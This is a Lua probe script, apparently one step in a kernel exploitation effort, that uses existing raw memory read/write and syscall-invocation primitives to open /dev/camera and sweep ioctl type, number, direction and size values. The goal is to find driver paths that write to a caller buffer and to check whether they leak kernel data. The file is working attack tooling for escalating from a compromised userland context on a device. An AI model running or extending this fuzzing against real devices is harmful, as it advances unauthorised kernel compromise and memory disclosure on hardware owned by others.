-- CRASH_CLASS: MODERATE
-- PROBE 1077a: 1076a varied the _IOC type field (bits 8-15), not the number, and found that
-- ioctl(camera, _IOW(type=6|7, nr=0, size=8), buf) writes 8 zero bytes into the caller buffer.
-- That proves the camera driver reaches a caller pointer, which is the first device whose ioctl
-- is not a uniform rejection. This sweep walks type 0..63 and number 0..3 across all three
-- direction bits at size 8, then repeats the hits at larger sizes to see how much is written and
-- whether any of it is data rather than zeroes.
print("=== PROBE 1077a: CAMERA IOCTL TYPE/NUMBER SWEEP ===")
print("")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function as_addr(x) local m=tostring(x):match("0x(%x+)"); if m then return tonumber(m,16) end return to_num(x) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local sc_open=mk(5); local sc_ioctl=mk(54); local sc_close=mk(6)

local path="/dev/camera"
local pb=memory.alloc(0x20); local pa=as_addr(pb)
for i=1,#path do wd(pa+i-1,path:byte(i)) end
wd(pa+#path,0)
local okF,fdv=pcall(function() return sc_open(uint64(pa),uint64(4),uint64(0)) end)
local fd = okF and to_num(fdv) or -1
print(string.format("[O] /dev/camera fd=%d", fd))
if fd < 0 then print("=== DONE 1077a ===") return end

local NB=0x400
local buf=memory.alloc(NB); local ba=as_addr(buf)
local function paint() for i=0,NB/4-1 do wd(ba+i*4,0xA0000000+i) end end
local function chgd()
  for i=0,7 do if rd(ba+i*4) ~= 0xA0000000+i then return true end end
  return false
end
local function dump(n)
  local t={}
  for i=0,n-1 do t[#t+1]=string.format("%08X", rd(ba+i*4)) end
  return table.concat(t," ")
end

local changes={}
local function probe(dir,typ,num,size,quiet)
  local cmd = dir + size*0x10000 + typ*0x100 + num
  paint()
  local ok,rv=pcall(function() return sc_ioctl(uint64(fd),uint64(cmd),uint64(ba)) end)
  local r = ok and to_num(rv) or -999
  local c = chgd()
  if c or (not quiet and r ~= -1 and r ~= 22) then
    changes[#changes+1]={cmd=cmd,rv=r,chg=c,dir=dir,typ=typ,num=num,size=size}
    print(string.format("  C %08X rv=%d chg=%s %s", cmd, r, tostring(c), dump(4)))
  end
  return r,c
end

print("[A] dir x type 0..63 x number 0..3, size 8")
for _,dir in ipairs({0x40000000,0x80000000,0xC0000000}) do
  for typ=0,63 do
    for num=0,3 do
      probe(dir,typ,num,0x08,true)
    end
  end
end
print(string.format("  [A] changes: %d", #changes))
print("")

print("[B] hits at larger sizes")
local hits={}
for _,e in ipairs(changes) do hits[#hits+1]=e end
for _,e in ipairs(hits) do
  for _,size in ipairs({0x10,0x20,0x40,0x100}) do
    local cmd = e.dir + size*0x10000 + e.typ*0x100 + e.num
    paint()
    local ok,rv=pcall(function() return sc_ioctl(uint64(fd),uint64(cmd),uint64(ba)) end)
    local r = ok and to_num(rv) or -999
    print(string.format("  S %08X rv=%d %s", cmd, r, dump(8)))
  end
end
print("")
print(string.format("[F] total change rows=%d alive fd=%d", #changes, fd))
print("=== DONE 1077a ===")
